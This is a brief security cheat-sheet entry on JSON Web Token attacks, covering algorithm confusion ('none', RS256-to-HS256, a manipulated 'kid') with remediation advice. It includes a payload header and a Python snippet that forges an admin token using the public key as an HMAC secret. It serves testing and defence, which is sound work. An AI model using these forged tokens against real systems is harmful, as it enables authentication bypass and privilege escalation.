# JWT Attacks

## Summary
Exploit JSON Web Token implementation flaws to bypass authentication or escalate privileges.

## Detection

### Algorithm Confusion
Test with modified `alg` header:
- `none`: `{"alg":"none"}`
- `HS256` (symmetric) when server expects `RS256` (asymmetric)
- Change `kid` to point to a controllable file

### Key Confusion
- Obtain public key (from JWKS endpoint)
- Sign tokens with HS256 using public key as HMAC secret

## Payloads

```json
{"alg":"none","typ":"JWT"}
```

```python
# RS256 → HS256 with public key
import jwt
pub_key = open("public.pem").read()
token = jwt.encode({"sub":"admin","role":"admin"}, pub_key, algorithm="HS256")
```

## Remediation
- Enforce algorithm whitelist on server
- Validate `kid` against trusted keys
- Use separate secrets per algorithm
